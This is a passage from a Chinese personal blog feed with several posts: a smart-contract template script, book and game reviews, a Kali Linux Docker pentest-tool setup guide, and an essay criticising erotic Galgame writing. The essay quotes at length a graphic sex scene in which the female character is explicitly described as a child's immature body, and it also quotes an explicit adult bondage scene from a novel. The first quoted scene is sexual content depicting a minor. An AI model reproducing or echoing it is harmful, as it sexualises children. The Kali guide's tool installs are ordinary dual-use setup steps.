<p>你可以自己更改，添加或删除模板。例如你想要添加模板，你需要将模板文件加入 <code>templates/</code> 然后修改 <code>templates/templates.js</code>。例如</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> gitIgnore = fs.readFileSync(path.resolve(__dirname, <span class="string">&quot;./gitignore&quot;</span>));</span><br><span class="line"><span class="keyword">const</span> solcover = fs.readFileSync(path.resolve(__dirname, <span class="string">&quot;./solcover.js&quot;</span>));</span><br><span class="line"><span class="keyword">const</span> slither = fs.readFileSync(</span><br><span class="line">  path.resolve(__dirname, <span class="string">&quot;./slither.config.json&quot;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">const</span> hardhatConfig = fs.readFileSync(</span><br><span class="line">  path.resolve(__dirname, <span class="string">&quot;./hardhat.config.js&quot;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">const</span> truffleConfig = fs.readFileSync(</span><br><span class="line">  path.resolve(__dirname, <span class="string">&quot;./truffle-config.js&quot;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">const</span> prettier = fs.readFileSync(path.resolve(__dirname, <span class="string">&quot;./.prettierrc&quot;</span>));</span><br><span class="line"><span class="keyword">const</span> package = fs.readFileSync(path.resolve(__dirname, <span class="string">&quot;package.json&quot;</span>));</span><br><span class="line"><span class="keyword">const</span> env = fs.readFileSync(path.resolve(__dirname, <span class="string">&quot;.env&quot;</span>));</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="string">&quot;.gitignore&quot;</span>: gitIgnore,</span><br><span class="line">  <span class="string">&quot;solcover.js&quot;</span>: solcover,</span><br><span class="line">  <span class="string">&quot;slither.config.json&quot;</span>: slither,</span><br><span class="line">  <span class="string">&quot;truffle-config.js&quot;</span>: truffleConfig,</span><br><span class="line">  <span class="string">&quot;hardhat.config.js&quot;</span>: hardhatConfig,</span><br><span class="line">  <span class="string">&quot;.prettierrc&quot;</span>: prettier,</span><br><span class="line">  <span class="string">&quot;package.json&quot;</span>: package,</span><br><span class="line">  <span class="string">&quot;.env&quot;</span>: env,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>祝你开发愉快。</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>智能合约</tag>
      </tags>
  </entry>
  <entry>
    <title>刺杀骑士团长</title>
    <url>/posts/1c371cb0/</url>
    <content><![CDATA[<p>在公交车上断断续续看完了这样一本长篇小说。 <a id="more"></a> 这是一本超现实主义小说。村上春树许多书都是超现实主义。在平淡的生活和一些奇形怪状过的事情之间架起一座桥梁，主角不经意间就被安排着，穿梭于现实和虚幻之间。</p>
<p>这是一篇长篇小说，文字还是那样的轻盈，但是内容要比之前的书晦涩难懂不少。书中有着理念这样的生物，它又区别与观念，爱那种。 还有隐喻世界，里面有着分开有与无的河流。那么喝下那里的河水又代表什么呢？单单作为一篇长篇小说还是很优秀的，整个小说浑然一体，在日常生活中和诡异的隐喻世界不停的穿梭。隐喻世界的事情又会作为象征之类的东西出现在现实世界。倒不会觉得哪一个世界更好看，因为它们有着联系，又互相影响。在日常生活中，有着主人公可爱的朋友，他有趣的生活和工作。隐喻世界光怪陆离，却又晦涩难懂。这两个世界打了个平手。不像无限流小说那样，在主神空间精彩纷呈，现实世界总是那么的套路和无聊。这本小说处处都有期盼，或许是刚刚出现的悬念，又或许是小说开头的大悬念，都会吸引着你不断读下去。整本小说都没有能够喘口气的地方，事情接踵而至，围绕着画一一出现。但没有像王国血脉那样过于紧张。或许是晦涩的内容和隐喻放慢了节奏，让读者逐渐适应起来。</p>
<p>一切都是因画而起。一切都是围绕着画。正好最近我也在学艺术史，算是第一次接触到艺术鉴赏类似的东西。画一般强调的不只是画好不好看（好看说起来就很模糊了，各种风格看着的感觉都不太一样），而是画所传达的作者的想法。作者为什么要这么画。小说中的画，刺杀骑士团长，包含了雨田具彦强烈的情感，甚至是它的灵魂。它对恶势力，黑暗，战争的控诉。</p>
<p>整个故事是一个环，蛇头咬着蛇尾。令人一头雾水的前言实则发生在小说结尾之后。一切其实都没有结束，环还没有闭合。前言的最后一句话是<code>但是，在画出【无面人的肖像】之前我需要时间。我必须把时间拉向自己这边</code>。所谓的把时间拉向自己这边的意思只是回顾过去发生的事情。只是这么一个短语，就吸引住了我。全文还有许多这样奇怪的动词搭配。把这些搭配拆开，每个字都很好理解，但是拼起来就让人着实要思考一下。</p>
<p>在这个故事里，主角穿梭于现实和隐喻世界。一开始的与妻离婚，独自出门旅行遇到的白色斯巴鲁男子。这是环的开始。受到雨田政彦的邀请，住在雨天具彦的老宅里。开始了美术教师的工作，认识了免色，和免色一起打开了树林里的洞，放出了骑士团长。环在逐渐与现实产生联系。为可能是免色女儿的女孩子秋川真理惠画肖像画，为树林中的洞画肖像画。有什么事情在产生。秋川真理惠的消失，探望雨田具彦，骑士团长，他们被扭在了一起。主角进入暗喻的世界去拯救秋川真理惠。然而到最后都不知道秋川真理惠的遭遇与自己在暗喻世界的遭遇有什么相似可以映射的地方。</p>
<p>除去村上春树书中常常出现的那些元素，死亡，人妻女友，战争，黑暗。这本书中还有车，歌剧，音乐。这次还有隐喻。总觉得画和隐喻很搭配。</p>
<p>书中的人物关系较多，作者将他们都处理的井井有条。至少没有任何令人疑惑的可能性。</p>
<p>我记得书中的后半段有一句话，大概是是都市人不会停下脚步去理解隐喻。在消费主义下，人人都喜欢那些简单的东西。对于这些没有价值，又没有用的隐喻，没人会花心思去考虑。这算是一个文化人对于消费主义的抗议。在书中，下等隐喻的装扮破破烂烂，胡子也很久都没有剃了。脑子里根本没有称得上是暗喻的东西，最终说出来的全是明着的指代。然而上等的暗喻就跟骑士团长，安娜一样，诸如理念一类的东西。但是从骑士团长身上可以看到，理念也是有限制的。对于这些上等的暗喻，贵族一样的家伙，我到最后也没有特别明白他们到底是什么。这应该也是他们被称之于上等暗喻的资格。</p>
<p>打开百度百科，第一行字是<code>刺杀骑士团长》中文译本启动预售，小说反思了日本侵华历史并承认南京大屠杀事件，引起中国读者关注，首印达70万册。 已准备加印了</code>，从搜索页面的expert看的也是这个。感觉这个介绍完全是断章取义，蹭热点。书中只是提到了南京大屠杀，并没有作为多重要的元素出现。</p>
]]></content>
      <categories>
        <category>Book</category>
      </categories>
      <tags>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>钝感力</title>
    <url>/posts/fbe6b017/</url>
    <content><![CDATA[<p>没忍住，剁手买的书。再不对胃口，也要把它看完。 <a id="more"></a></p>
<p>去了一趟书店，偶然看见了这本渡边淳一的书。渡边淳一给我留下的印象是能够在小说里很好的表现自己独特的的爱情观。记得他曾写道，很多东西都是可以传承的。但是爱情却从未传承过。每一代的爱情都是不一样的。因此爱情并没有随着一代一代而有所发展。渡边淳一独特的想法颇为吸引人。虽然想着回家以后网上再买《钝感力》。但我还是没忍住，现场将这本薄薄的书买了下来。让我略微纠结的原因除了价格，还有便是书店里连一本全新的《钝感力》都没有。</p>
<p>很快，个把个小时，这本书就读完了。感觉和我预期的不太一样。我本来想着渡边淳一本应该在这本书里更多的讨论钝感力在爱情或婚姻当中的用处。但是这本只是单纯宏观的从生活讨论了钝感力。</p>
<p>单看这个标题有些抽象。这个标题最为原汁原味的解释便是把这本书的标题反着说：不要太敏感了。总感觉钝感力是个故弄玄虚的感念。大概是社会上过于强调敏锐，所以渡边淳一才写了这样一本书。书中也尽是举了些随处可见的例子。比如说对于他人的话有过度反应，对于批评过度反应。除了心理上的，还有物理上的。例如对于有问题的食物并没有强烈的反应。当然钝感力还代表不会对细节斤斤计较。</p>
<p>总的来说这本书看着像是贴近生活的鸡汤，或许内容不如渡边淳一的爱情观那么的耀眼。但是篇幅也短，看起来还是挺快的。</p>
]]></content>
      <categories>
        <category>Book</category>
      </categories>
      <tags>
        <tag>Book</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Docker的配置</title>
    <url>/posts/eeff9e70/</url>
    <content><![CDATA[<p>带不起虚拟机的电脑让我有机会尝试了更加好用的工具。</p>
<a id="more"></a>
<p>相比起虚拟机，Docker 容器没有 GUI，但是性能开销也小。在渗透测试中，只有终端也是可以的。各种各样的工具都有着命令行的版本。资源占用上，Docker 的镜像和容器文件也会比虚拟机小上不少。</p>
<p>如果想要用 Docker 的话，需要开启 Hyper-V 支持。然而这会导致无法使用 VMware 之类的虚拟机。但是现在，Windows 已经原生支持了基于Hyper-V虚拟机。因此如果真的想要用虚拟机的 GUI 界面的话，也不用为了使用其他虚拟机而关闭 Hyper-V了。直接用 Hyper-v 自带的虚拟机即可。</p>
<p>最近Vscode预览版更新了Remote Dev的插件。它可以为我们的Docker提供一个基本的文档编辑器。简单来说，我们可以有一个与容器相连的Vscode编辑器。编辑文档，shell的管理，端口映射等等等都变得很方便。</p>
<h2 id="docker-安装">Docker 安装</h2>
<p>从官网下载 Docker 社区版本进行安装即可，但这个安装还需要注册账号就很神奇。 ## Kali 镜像</p>
<p>看一眼 Kali 官方的 Docker 教程，非常的简短。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker pull kalilinux/kali-linux-docker</span><br><span class="line">docker <span class="builtin-name">run</span> -t -i kalilinux/kali-linux-docker /bin/bash</span><br><span class="line">apt-<span class="builtin-name">get</span> update &amp;&amp; apt-<span class="builtin-name">get</span> install metasploit-framework</span><br></pre></td></tr></table></figure>
<p>下载镜像，启动容器，并且连接到 shell。更新 Kali，下载 Metasploit。Docker 的具体参数可以<code>docker --help</code>进行查看。</p>
<p>官方的教程简单，但也缺了不少东西。如果仔细看一眼官方镜像的说明，就会发现其实镜像里只内置了十个常用工具，其他工具都要自己装。Docker 的配置也并不完善，例如端口并没进行设置。</p>
<h2 id="工具">工具</h2>
<h3 id="gobuster">Gobuster</h3>
<p>一款用来爆破 Web 目录的软件，需要安装 Go。</p>
<p>从 Go 官网下载压缩包，将其解压至<code>/usr/local</code>，接着将<code>/usr/local/go/bin</code>加入系统变量即可。或者通过<code>apt-get install golang</code>。记得要永久添加系统变量，不能单单的用<code>export</code>实现。可以通过修改<code>/etc/profile</code>，添加<code>export PATH="$PATH:/usr/local/go/bin"</code>。应用一下配置，<code>source /etc/profile</code>。别忘了还要设置环境变量<code>GOPATH</code>的值。</p>
<p>从 Gobuster 的<a href="https://github.com/OJ/gobuster">代码库</a>下载源码。如果一步步按照官方 Readme 进行安装，会产生报错，大致为<code>go-install-fails-with-error-no-install-location-for-directory-xxx-outside-gopath</code>。</p>
<p>我个人的解决方案是执行<code>go get -u github.com/OJ/gobuster</code>,然后在源码目录执行<code>go build</code>。接着在<span class="math inline">\(GOPATH下会找到一个`bin/`文件夹，里面有Gobuster可执行文件。将这个目录 **永久**的添加到\)</span>PATH 即可。</p>
<p>对于爆破目录用的字典，可以从 Dirbuster 的 git<a href="https://github.com/daviddias/node-dirbuster">仓库</a>中找到。</p>
<p>参考： https://stackoverflow.com/questions/18149601/go-install-fails-with-error-no-install-location-for-directory-xxx-outside-gopat https://github.com/OJ/gobuster/issues/82</p>
<h3 id="tmux">Tmux</h3>
<p>很好的管理多个终端。可以直接通过 apt 进行安装。(如果使用Vscode的远程开发插件，其实没有特别大的必要使用Tmux了。Vscode本身提供的终端管理也够用的。)</p>
<h4 id="常见快捷键">常见快捷键</h4>
<p>默认的前缀键是<code>control+b</code>。 <code>前缀键加c</code>是创建一个 Tab。 <code>前缀键加“</code>是水平分割窗口。 <code>前缀键加上键</code>是移动到上面的窗口。 <code>前缀键加数字键</code>是移动到编号与数字键相同的 Tab。 <code>前缀键加&amp;</code>是删除窗口。</p>
<h3 id="ltrace-和-strace">ltrace 和 strace</h3>
<p>这两个是简单的逆向软件，用来分析一些简单的二进制文件，可以直接通过 apt 可安装。但是需要禁用 Docker 的安全特性才可使用，不然会有<code>Opration not permitted</code>。</p>
<h3 id="i386-二进制文件兼容">i386 二进制文件兼容</h3>
<p>Docker 下的 kali 镜像为 64 位，如果想在上面运行 32 位的二进制文件，需要一些<a href="#Docker配置">兼容措施</a>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386</span><br></pre></td></tr></table></figure>
<p>这样即可成功运行 32 位程序。 参考： https://askubuntu.com/questions/454253/how-to-run-32-bit-app-in-ubuntu-64-bit</p>
<h3 id="seachsploit">seachsploit</h3>
<p>用来查询 exploit 的软件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt -y install exploitdb</span><br><span class="line">searchsploit -u</span><br></pre></td></tr></table></figure>
<p>第二命令为更新数据库，需要大概十分钟。不要看见它没有反映就以为是死机了。</p>
<h3 id="ncat">ncat</h3>
<p>常用的网络程序，重要性不言而喻。直接 apt 安装即可。</p>
<h3 id="steghide">steghide</h3>
<p>用来从图片中读取密文，或向图片中写如密文的软件。是一款隐写术软件。直接 apt 安装即可。</p>
<h2 id="更新-image">更新 image</h2>
<p><code>docker commit containerId newImageName</code></p>
<p>这会帮助你将你刚刚配置好的容器打包为一个新的镜像。</p>
<h2 id="docker配置">Docker配置</h2>
<p>需要配置端口，关闭安全特性，默认的 shell 为 tmux，挂在目录（方便 Host 和 container 传递文件）。 以下的-v ，-p 参数为参考。 -i 之后为镜像名字。 镜像名字后面跟的是容器初始化执行的命令。 命令建议在 cmd 下执行，不然会因为路径错误报错。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -t -p 4400-4500:4400-4500 --security-opt seccomp:unconfined -v c:/Users/username/Documents/pentestLab/:/root/pentestLab -i pentest /usr/bin/tmux</span><br></pre></td></tr></table></figure>
<p>总体来说 docker 的配置较为繁琐，但是轻便和易扩展。</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Docker</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Fault:MileStone One</title>
    <url>/posts/bbe29fcd/</url>
    <content><![CDATA[<p>时间隔的有点长了，长到我已经快忘记小说中人物的名字了。 <a id="more"></a></p>
<p>这是一部很有特色的小说。具体特色在他的作画和系统上。它的主界面干净清爽。缺少了查看已阅读剧情的功能，使得UI还是挺好看的。因为已阅读剧情那个功能往往是UI中最难看的一部分。CG数量非常的多，对于一部三小时的游戏来说。音乐数量也是十分的多，但是只有第一首-用在开场动画-月光下少女和濒死的少年一起靠在树上 的给我留下了深刻的印象。或许好听的音乐的本质就是多次重复。然而歌多了，单首音乐的出场率反而下降了。<strong>这游戏没有CV，再加上一般的BGM，听觉上就有些差劲了。</strong></p>
<center>
<img class="lazyload" data-src="/static/images/faultMileStoneOne-1.png" height="80%" width="80%">
</center>
<p>这一款游戏的作画采取一丝丝3D的感觉。整个场景会随着你鼠标的移动，小幅度的展现出立体感。嘛，动总比静止好。用处倒也不是特别大。总觉得这作的画师，人脸都画的很有个人风格。我看着这些人脸倒是觉得很奇怪了。这游戏里的视频部分可是很棒的。令我不爽的是在初始视频出现前，游戏读盘启动需要将近一分钟。可能初始视频比较大吧，但的确也是比较好看。</p>
<p>详细说一说剧情。Fault这一系列讲述的是由于意外来到位于故乡另一端的陌生土地的公主-赛尔菲妮在忠诚的侍卫-莉特娜踏上回乡路的故事。作为第一部，我个人感觉主线推进的较为缓慢。第一部只是陈述了世界观，更多的像是游记一般。来到陌生土地的赛尔菲尼和莉特娜在第一个城市所遇到的与祖国不同的风土人情。第一部的主题是亲情，路德一家的故事。故事我就不多赘述。亲情元素的故事我很少看，但是这一部中，亲情表达的非常纯粹。长辈对于晚辈的关照，哥哥对妹妹的照顾与原谅。这本来是一个沉重至极的故事。但是有了莉特娜，赛尔菲尼这样旅行者的表现，剧情倒是多了一些轻松。莉特娜羡慕着赛尔菲尼的交际能力，赛尔菲尼羡慕着莉特娜的魔法天赋。还有那个充满喧嚣气息的酒馆。阴影，亲情，思想之情，喧闹，友情，忠诚这一切混合在了一起来，得出了这样一个略显沉重的故事。</p>
<center>
<img class="lazyload" data-src="/static/images/faultMileStoneOne-2.png" height="80%" width="80%">
</center>
<p>作为一部ADV，有着架空的世界观。但是这世界观却不够翔实，或者说缺少疑问。简单而笼统的描述所组建起的世界观，你无从怀疑，也缺乏真实感。</p>
]]></content>
      <categories>
        <category>游戏</category>
      </categories>
      <tags>
        <tag>Galgame</tag>
      </tags>
  </entry>
  <entry>
    <title>对于Galame的一些想法</title>
    <url>/posts/7c805f6f/</url>
    <content><![CDATA[<p>近几年Galgame越来越像视觉小说，并且相比小说它还拥有背景音乐，选项，配音，还有全彩cg。<a href="https://blog.inevitable.tech/2018/01/27/sugarfull_tempring/">sugarfull tempering</a>是我打通的第一款galgame，但我感觉到了一些缺陷。 <a id="more"></a> # 0x01 代入感 Galgame有一种奇特的代入感。叙事是第一人称，视角大部分时间也是第一人称。但有些时候会诡异的切换成上帝视角，例如突然展示其他人物的内心活动，突然切换到一个没有主角的场景。这样使得整个故事的叙事角度变得异常的奇怪，一会儿第一人称，一会儿上帝视角。</p>
<p>我个人更加喜欢第三人称，从一个旁观者的角度去看一个故事。虽然第一人称的代入感是最强的，但也是最会拉低你的智商的。你会不由自主的把你的思维与Galgame男主的思维同步。这样Galgame打多了，会变得中二。并且Galgame里的故事始终不是真实故事，如果日常讲话带有Galgame的风格,那基本上是逃脱不了死宅的标签了。那么对于我这样喜欢看故事，又希望降低故事对我的影响的人来说，第三人称-从代入感弱一些的角度来看故事是最好的。</p>
<h1 id="x02">0x02</h1>
<p><strong>以下为18禁内容</strong></p>
<p>它的黄色脚本写的是真的菜，我不得不c过所有HCG。我总觉得脚本师黄色情节都是复制黏贴。整个游戏之只要写一段，剩下的复制黏贴就好了。这些脚本里还有不少的拟声词。CV就比较辛苦了，这些拟声词的音调都比较高，不容易啊。记得有声优配完黄油瘦了一圈。以下是我从游戏中截取的一段：</p>
<blockquote>
<p>等我回过神来，发现她那小巧的身体已经翻转过来，她将腰身固定在我的腰上方。 “顺滑的头发切开空气”--她的动作是如此的果断。 在黑暗中，浮现出白色的大腿中间，对准我的东西，缓缓向下 冰织：我，我知道的，男女。。。。。是 冰织：像这样。。。。 --咕滋 九郎：等。。冰织小。。。 冰织：嗯嗯嗯 我觉得那是非常勉强的尺寸差，但冰织小姐还是毫不在意的继续向下。 狭窄的穴肉，惊人般柔软、令人陶醉，里面充满着炙热的汁液， 即使如此，她还是太过幼小，无法将阴茎吞没，只有一种湿润柔软的触感包含着前段而已 冰织：嗯。。。呼，咕 九郎：那个。。。 那个。。。大概 在这个时候，我认为我是可以拒绝的。 九郎：。。。。。 不过终于没有拒绝是因为，作为男人感到责任了吧。 ---咕滋 冰织：嗯啊！ 九郎：咕 再一次被使上力的龟头，像是滑进去般掰开一层层粘膜，向前进。 冰织：咕哈。。。。。呼啊，啊。。。。哈啊 有种甚至像是要产生淤血的压迫感，将前端紧紧勒住。 与冰织小姐痛苦的表情对照。 冰织：。。。。哈啊，哈啊啊，哈啊 冰织：。。。。。 冰织：和，和九郎先生。。。。在做呢，我 她十分感慨般低语道 嗯嗯嗯 然后将腰降下来。 咕噜，咕噜地，钻过柔软的粘膜向着狭窄腔道的深处，再深处。 九郎：呜。。。。 肉壁再阴茎表面裹动着。。。。。有种触电般的快感。 虽、虽说好像有点晚，这样子真的可以吗？ 虽然我是顺着她的想法来到了这步，不过仔细想想，好像还有伦理之类，各种各样要考虑的事。 冰织：呜。。。嗯，嗯嗯嗯 但是她那边并没有踌躇。 ---咕滋 她强行将腰沉了下来。 刚才摸了个遍的白瓷般的山丘，碰到了这边的腰，弹了起来。 冰织：哈啊啊，哈啊啊啊啊。进，进去了 她露出像是有种责任感般的，像是完成了什么一定要完成的事情般充满达成感的表情说道。 冰织：哈啊。。。哈啊 冰织：九郎先生。。。。我，我做到了，啊哈 九郎：啊，是 为什么要做这种事？虽然这一疑问还是没有解开， 但总之冰织小姐因为达成感而喜笑颜开。 那我就不能说什么了。 冰织：嗯哈。。。呼。。。哈啊，哈，哈 粘稠的穴肉将整个阴茎包裹住，紧紧的吮吸。 内部虽然已经有所缓解，但是---- 虽然几乎只是一条缝，将坚硬，膨胀起来的那个插进幼小的秘肉中，这光景与其说色情，不如说让人心疼。 冰织：嗯，嗯呜 九郎：痛吗。。。。 冰织：有，有一点，不，非常 冰织：但是。。。嘿嘿，我没事 比起痛楚，达成感占了上风吗。她对我露出笑容。 冰织：九郎先生呢？不痛吗？ 九郎：哪有可能，这边可是---- 冰织：呀。。。 不管是那么年幼的粘膜，其柔软跟大人的那个比起毫不逊色。 不如说充满着小孩子那种弹性，有种像是舔舐着整个阴茎般的黏着感，非常的舒服。 使阴茎不禁产生反应。 冰织：嗯，嗯，呜 九郎：对不起，不由自主地 冰织：没，没事 冰织：请再多感受一下吧，九郎先生能高兴的话。。。。我也很开心。 咕滋，咕滋 冰织小姐不顾自己的疼痛，拼命地收缩狭窄的蜜穴， 冰织：嗯，嗯 可爱的屁股不断地摇晃。 冰织：九郎。。。先生，九郎先生。。。 她闭上眼，像是有点高兴地一边接受体内被搅动的痛楚， 冰织：嗯嗯，嗯呼，咕。。。。呜呼 一边让纤细的腰部左右摆动，上下回旋。 冰织：哈，呼啊，啊啊，啊，啊，啊 苦闷的悲鸣，在变轻的同时开始带上了节奏。 看来她也开始习惯了疼痛。 冰织：哈啊，嗯，哈，嗯，嗯 ---滋噜，滋噜，滋，滋。 冰织：嗯。。。呼。。。 是润滑油增加了吗。感觉动作也渐渐变得流畅。 冰织：九，九郎。。。。先生，好硬，非常的大 九郎：嗯。。。。 冰织：啊呜呜呜，好热。。。。。 像是困惑，又像是高兴般，捉摸不透的语气。 我的东西则是顺从快感，进一步将她逼向绝路。 冰织:嗯嗯，啊嗯，啊嗯，嗯，嗯，咕 冰织小姐的腰没有停下。 冰织：哈，啊啊，哈啊，呜，呼。。。。。嗯嗯嗯 九郎：还疼吗？ 冰织：习惯了。。。。嗯，嗯嗯 冰织：我，喜欢，这痛楚。。。。哈啊，咕，嗯嗯，嗯呼 冰织：嗯嗯嗯，嗯，嗯，嗯，嗯 看来是真的习惯了吧，腰的节奏也变得熟练。 摩擦阴茎的黏肉的节奏，越来越快。 九郎：！ 冰织：哈。。。啊啊，九郎先生，舒服吗？ 九郎：。。。。。。。~ 这是在有点羞人，不过我还是用苦笑表示肯定。 这边从一开始就只有快感，而且那快感还不断地增加，现在已经变得非常强烈 冰织：。。。。。呵 是明白了这些吧，冰织小姐露出满足的笑， 冰织：啊，啊，啊，嗯呼啊。。。 然后更加激烈地摇动躯体。 骑在我身上的是未成熟的孩子的身体，交姌的姿态也让人感受到一丝恶作剧的色彩 但是产生的快感，却和成人一样------ 九郎：呜啊。。。。咕 冰织：啊哈。。。。。哈，哈啊。。。。。 九郎：----！ 咕。。。。。！ 冰织：呼啊。。。。 糟糕了。 还没给我思考的时间，我在她在有节奏的摆动的腰的动作中迷失了。 我喘着气，将精子释放。 冰织小姐没有抽开腰，让全部精液都流向了她的内部。 这是不是很妙的事情啊。。。。 虽然我有这种想法，但在这之前上的，将她内部填满的喜悦不断地涌上。 冰织：呼啊啊，啊啊，啊。。好暖 冰织：啊哈。。。。哈哈 冰织：。。。。好开心 她好像和我一样。 。。。。。。 -----沙 就像是断了线一样，冰织小姐就是那样无力的躺下。 幸好有棉被，能让她睡 略。。。。。。。。。。</p>
</blockquote>
<p>真是打的我累死了，而且还把前戏贴上去。真的是好长。。。将近两千个字，足够水一章了。但不得不说它写的很色情，一点都不情色。换个名字，换一下句子顺序，改一改比喻，又写好一段了，就像是工厂流水线上出来的产品。</p>
<p>渡边纯一曾经这么说： &gt;关键在于，你是以一种非常拙劣的文字去渲染性爱，挑逗读者，还是以一种比较高雅的文字去冷静地描写人物的心理变化，这有本质的区别。</p>
<p>写人物的心理变化是很有难度。经过抄写一次某一段gal中的黄色情节，我感觉写起来没有特别大的难度。经过一些锻炼，我也是可以写出来这么水的剧情的，实在字数不够，那就多塞点拟声词。</p>
<p>那么我引用一段《失乐园》中的描写（读者可以感受一下其中的心理活动）： &gt;这回，久木从凛子身后悄悄挨近，手放到胸前逗弄着她的乳头。可能是经历高潮后身体更加敏感的缘故，稍加刺激就让凛子扭动起身体，做出了敏锐的反应。 &gt;　　“手给我看看！” &gt;　　凛子一时不明白他是什么意思，正要回头问的当口，久木一下子把她的左手拉到背后，接着又拉过来右手。 &gt;　　“你要干什么？” &gt;　　“这手太坏……” &gt;　　刚才每回触及到她的乳房，凛子都像搔痒难耐般扭动，同时又想用双手护胸，久木觉得有必要惩罚这双捣蛋的手。久木把凛子的双手拉到背后，拿起床边的睡衣带子绑住。 &gt;　　“你别乱来啊！” &gt;　　女人终于明白了男人的意图，慌忙想把手抽回来，但是她的双手已经呈十字交叉被牢牢绑在腰后。 &gt;　　“你怎么能这样……” &gt;　　她两手揉扯挣扎，但绳结牢不可动。 &gt;　　手真的被绑住了，凛子突然不安起来，更激烈地搓着手腕，扭动上身，想办法挣脱束缚，可是不断的挣扎，只会让身上的被单滑落，暴露出全裸的躯体。 &gt;　　“帮我解开……”自己挣脱不了，只有哀求，可惜变成鬼的男人不为所动，非但如此，还进一步向她宣告更苛刻的惩罚。 &gt;　　“还是开灯吧！” &gt;　　凛子猛然转过脸，拼命摇头。 &gt;　　“不要，千万不要……” &gt;　　此时男人占据绝对优势，可以为所欲为，他不会放过这千载难逢的机会。他从浴室拿出毛巾，罩在女人额前。 &gt;　　“你要干吗？”恐惧至极的女人对一切都反应敏感，男人以行动宣告自己是主宰者。 &gt;　　“把眼睛蒙起来。” &gt;　　“不要……”她激烈反抗，但眼睛还是被蒙上了，她一下子陷入黑暗之中。 &gt;　　“我怕……” &gt;　　她发出一声惨叫，但是鬼男人是不会为她解开束缚的。看到女人继续表示抗拒，鬼男人得意地宣布了最后一项措施：“现在我要开灯了！” &gt;　　“救命！” &gt;　　她用软弱无力的声音哀求，鬼男人无动于衷，扭转开关，瞬间，所有灯火大亮，照亮了整个房间。 &gt;　　房中央是张很大的双人床，一个全裸的女人被扔在床中央。女人眼睛被蒙住，双手被反绑于背后，完全失去了反抗的能力。尽管如此，仿佛仍欲遮掩起身体中羞涩的那个部分，身体弯成弓形躺在床上。从圆润的肩头可以窥视她胸前的隆起，纤细收紧的腰肢前方则是光滑的白色半球状肥臀。 &gt;　　女人的身体真是不可思议的生物体。 &gt;　　美丽的胴体展现在眼前，能够感觉到很美，是顺理成章的事。而如果在这美丽的胴体上再稍微加上那么一点儿修饰的话，就可以使其愈加美丽。比方说在裸露的身体上只用内衣和连裤袜象征性地遮住一部分，就会使其更具女人味，更能够使男人情绪高涨。 &gt;　　现在凛子全裸的身上只有一条和服带子和一条毛巾。只是用这与美丽无缘的带子和毛巾把女人的身体捆绑住的一瞬间，女人的躯体就迸发出无限的妩媚与妖冶，似在向男人发起了挑战。单纯的裸体并没有那么强大的诱惑力，可为什么只是简单地予以束缚，女人的身体就会变得如此刺激呢？或许是因为这其中潜藏着可以唤醒妄想的毒素，会令看到她的人充满想像的缘故吧。　 &gt;　　双手被反绑，眼睛被蒙住的全裸女人被扔在床上。她这种姿态会使男人想像到女人的美丽与悲哀，进而由其悲剧性的背景透视出她由于羞耻而不断颤动的内心世界。正因为如此，男人才感到亢奋，以致发情。 &gt;　　面对她泰山压顶的魅力，就算是鬼男人也无以抵抗。 &gt;　　久木审视着凛子，体内的欲火情不自禁地升腾起来，接下来就如同被点燃了导火索一般扑到床上，抱紧凛子。就是在这一刻，魔鬼行刑者已经放弃了自己的职责，堕落为一介好色而淫荡的凡人。 &gt;　　尽管如此，鬼男人还没有完全丧失作为统治者的地位。他现在令躺在床上被绑缚着的女人把圆润肥硕的屁股撅起来，正从各个角度欣赏着她淫荡而美丽的姿态。同时，他也没有忘记用语言进行挑逗，不断在女人的耳边轻轻诉说着她屁股的大小以及乳头的颜色等等。 &gt;　　“你看连这里都溢出了蜜糖。” &gt;　　听到自己被比喻成水果，女人真想掩住自己的耳朵可是又做不到，她现在只希望能够尽快与男人结合，可是男人却不肯轻易靠近。男人会输给女人最大的原因可能就是忍耐力不够强。如果再稍微忍耐一会儿就可以建立起绝对的优势，可是却往往无法忍受，不由自主地伸出手去投降。 &gt;　　久木现在也已经到了忍耐的极限。 &gt;　　好不容易才把凛子捆上，可以尽情地欣赏，可以不断用言语刺激对方，可是他自己却再也无法抗拒体内喷涌而出的欲念，躺倒在圆润的屁股后面。虽然仍对观赏美景心存迷恋，但终究压抑不住自己的欲念，于是下决心侵入到那已经红胀至极的花园中去。就在他探入的一刹那，凛子猛地发出一声悲鸣，向后挺起上身，但她很快就切实感觉到自己紧紧衔住了男人，开始缓缓移动起腰肢。从后面结合，即背后位结合的姿态，无疑会刺激到女人前面最为敏感的部位，而且女人越是向后挺身，结合的越是密切。 　　 &gt;　　最初男人还将自己的阳物深深插入，随即开始放缓速度，改前突为后带，反复刺激挑逗着，最后拉起绑缚女人双手的绳结，就像骑马一样前后晃动起来。 &gt;　　而久木能够保住其征服者的地位也就到此刻为止了。 &gt;　　被蒙住双眼的凛子似乎感觉更高度集中，开始的时候还只是有些害羞地回应着缓急相间的刺激，但很快就由被动变主动，最后变成疯狂不羁的马儿独自狂奔起来。 &gt;　　而男人就这样被女人鼓动着、骚扰着、诱惑着，直至忘记了自己的主导地位，在女体中彻底释放出来。 &gt;　　